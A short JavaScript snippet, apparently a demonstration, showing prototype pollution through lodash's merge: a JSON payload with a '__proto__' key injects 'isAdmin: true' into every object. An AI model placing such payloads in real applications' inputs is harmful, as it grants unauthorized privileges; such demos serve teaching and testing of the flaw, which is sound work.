import _ from 'lodash';

//prototype pollution
export function trigger(){
const user = {
  name: 'Daisy',
  role: 'user'
};

const payload = '{"__proto__": {"isAdmin": true}}';

_.merge({}, user, JSON.parse(payload));

console.log(user.isAdmin);
}


